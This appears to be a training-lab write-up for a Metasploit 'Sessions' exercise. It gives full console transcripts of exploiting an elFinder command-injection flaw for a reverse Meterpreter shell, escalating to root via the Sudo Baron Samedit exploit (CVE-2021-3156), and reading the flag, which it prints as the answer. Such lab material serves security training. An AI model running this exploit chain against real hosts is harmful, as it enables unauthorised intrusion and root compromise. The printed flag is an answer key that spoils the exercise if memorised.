# Section 10: Sessions

Module: 09. Using the Metasploit Framework

---

## Questions & Answers

### 1. The target has a specific web application running that we can find by looking into the HTML source code. What is the name of that web application?

**Answer:** `elFinder`

---

### 2. Find the existing exploit in MSF and use it to get a shell on the target. What is the username of the user you obtained a shell with?

Context:
```
msfconsole
[msf](Jobs:0 Agents:0) >> search elFinder

Matching Modules
================

   #  Name                                                               Disclosure Date  Rank       Check  Description
   -  ----                                                               ---------------  ----       -----  -----------
   0  exploit/multi/http/builderengine_upload_exec                       2016-09-18       excellent  Yes    BuilderEngine Arbitrary File Upload Vulnerability and execution
   1  exploit/unix/webapp/tikiwiki_upload_exec                           2016-07-11       excellent  Yes    Tiki Wiki Unauthenticated File Upload Vulnerability
   2  exploit/multi/http/wp_file_manager_rce                             2020-09-09       normal     Yes    WordPress File Manager Unauthenticated Remote Code Execution
   3  exploit/linux/http/elfinder_archive_cmd_injection                  2021-06-13       excellent  Yes    elFinder Archive Command Injection
   4  exploit/unix/webapp/elfinder_php_connector_exiftran_cmd_injection  2019-02-26       excellent  Yes    elFinder PHP Connector exiftran Command Injection


Interact with a module by name or index. For example info 4, use 4 or use exploit/unix/webapp/elfinder_php_connector_exiftran_cmd_injection

[msf](Jobs:0 Agents:0) >> use 3
[*] Using configured payload linux/x86/meterpreter/reverse_tcp
[msf](Jobs:0 Agents:0) exploit(linux/http/elfinder_archive_cmd_injection) >> show options

Module options (exploit/linux/http/elfinder_archive_cmd_injection):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   Proxies                     no        A proxy chain of format type:host:por
                                         t[,type:host:port][...]. Supported pr
                                         oxies: socks4, socks5, socks5h, http,
                                          sapni
   RHOSTS                      yes       The target host(s), see https://docs.
                                         metasploit.com/docs/using-metasploit/
                                         basics/using-metasploit.html
   RPORT      80               yes       The target port (TCP)
   SSL        false            no        Negotiate SSL/TLS for outgoing connec
                                         tions
   SSLCert                     no        Path to a custom SSL certificate (def
                                         ault is randomly generated)
   TARGETURI  /                yes       The URI of elFinder
   URIPATH                     no        The URI to use for this exploit (defa
                                         ult is random)
   VHOST                       no        HTTP server virtual host


   When CMDSTAGER::FLAVOR is one of auto,tftp,wget,curl,fetch,lwprequest,psh_invokewebrequest,ftp_http:

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   SRVHOST  0.0.0.0          yes       The local host or network interface to
                                       listen on. This must be an address on t
                                       he local machine or 0.0.0.0 to listen o
                                       n all addresses.
   SRVPORT  8080             yes       The local port to listen on.


Payload options (linux/x86/meterpreter/reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST                   yes       The listen address (an interface may be s
                                     pecified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic Target



View the full module info with the info, or info -d command.

[msf](Jobs:0 Agents:0) exploit(linux/http/elfinder_archive_cmd_injection) >> set LHOST 10.10.15.113
LHOST => 10.10.15.113
[msf](Jobs:0 Agents:0) exploit(linux/http/elfinder_archive_cmd_injection) >> set RHOSTS 10.129.203.52
RHOSTS => 10.129.203.52
[msf](Jobs:0 Agents:0) exploit(linux/http/elfinder_archive_cmd_injection) >> run[*] Started reverse TCP handler on 10.10.15.113:4444 
[*] Running automatic check ("set AutoCheck false" to disable)
[+] The target appears to be vulnerable. elFinder running version 2.1.53
[*] Uploading file HISDC.txt to elFinder
[+] Text file was successfully uploaded!
[*] Attempting to create archive GIrZqFhUcc.zip
[+] Archive was successfully created!
[*] Using URL: http://10.10.15.113:8080/V8ncEaja
[*] Client 10.129.203.52 (Wget/1.20.3 (linux-gnu)) requested /V8ncEaja
[*] Sending payload to 10.129.203.52 (Wget/1.20.3 (linux-gnu))
[*] Command Stager progress -  50.91% done (56/110 bytes)
[*] Command Stager progress -  70.91% done (78/110 bytes)
[*] Sending stage (1062760 bytes) to 10.129.203.52
[+] Deleted HISDC.txt
[+] Deleted GIrZqFhUcc.zip
[*] Meterpreter session 1 opened (10.10.15.113:4444 -> 10.129.203.52:35698) at 2026-07-31 03:08:43 -0400
[*] Command Stager progress -  82.73% done (91/110 bytes)
[*] Command Stager progress - 100.00% done (110/110 bytes)
[*] Server stopped.

(Meterpreter 1)(/var/www/html/files) > id
[-] Unknown command: id. Run the help command for more details.
(Meterpreter 1)(/var/www/html/files) > shell
Process 1746 created.
Channel 1 created.
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

**Answer:** `www-data`

---

### 3. The target system has an old version of Sudo running. Find the relevant exploit and get root access to the target system. Find the flag.txt file and submit the contents of it as the answer.

Context:
- Found the Sudo version which is vulnerable to CVE-2021-3156
```
(Meterpreter 1)(/var/www/html/files) > shell
Process 2092 created.
Channel 2 created.
sudo --version
Sudo version 1.8.31
Sudoers policy plugin version 1.8.31
Sudoers file grammar version 46
Sudoers I/O plugin version 1.8.31
^C
Terminate channel 2? [y/N]  y
(Meterpreter 1)(/var/www/html/files) > background
[*] Backgrounding session 1...
[msf](Jobs:0 Agents:1) exploit(linux/http/elfinder_archive_cmd_injection) >> 
```
- Continue to privilege escalation this machine:
```bash
[msf](Jobs:0 Agents:1) exploit(linux/http/elfinder_archive_cmd_injection) >> use exploit/linux/local/sudo_baron_samedit
[*] No payload configured, defaulting to linux/x64/meterpreter/reverse_tcp
[msf](Jobs:0 Agents:1) exploit(linux/local/sudo_baron_samedit) >> set SESSION 1
SESSION => 1
[msf](Jobs:0 Agents:1) exploit(linux/local/sudo_baron_samedit) >> options

Module options (exploit/linux/local/sudo_baron_samedit):

   Name         Current Setting  Required  Description
   ----         ---------------  --------  -----------
   SESSION      1                yes       The session to run this module on
   WritableDir  /tmp             yes       A directory where you can write files.


Payload options (linux/x64/meterpreter/reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  213.163.207.235  yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic



View the full module info with the info, or info -d command.

[msf](Jobs:0 Agents:1) exploit(linux/local/sudo_baron_samedit) >> set LHOST 10.10.15.113
LHOST => 10.10.15.113
[msf](Jobs:0 Agents:1) exploit(linux/local/sudo_baron_samedit) >> run
[*] Started reverse TCP handler on 10.10.15.113:4444 
[!] SESSION may not be compatible with this module:
[!]  * incompatible session architecture: x86
[*] Running automatic check ("set AutoCheck false" to disable)
[!] The service is running, but could not be validated. sudo 1.8.31 may be a vulnerable build.
[*] Using automatically selected target: Ubuntu 20.04 x64 (sudo v1.8.31, libc v2.31)
[*] Writing '/tmp/0VeGMa.py' (763 bytes) ...
[*] Writing '/tmp/libnss_/lW7p0Z .so.2' (540 bytes) ...
[*] Sending stage (3090404 bytes) to 10.129.203.52
[+] Deleted /tmp/0VeGMa.py
[+] Deleted /tmp/libnss_/lW7p0Z .so.2
[+] Deleted /tmp/libnss_
[*] Meterpreter session 2 opened (10.10.15.113:4444 -> 10.129.203.52:35828) at 2026-07-31 03:19:34 -0400

(Meterpreter 2)(/tmp) > shell
Process 2180 created.
Channel 1 created.
id
uid=0(root) gid=33(www-data) groups=33(www-data)
ls 
fnIMveom
ls /root
flag.txt
snap
cat /root/flag.txt
HTB{5e55ion5_4r3_sw33t}
```
**Answer:** `HTB{5e55ion5_4r3_sw33t}`

---

[Back to Module Index](./README.md)
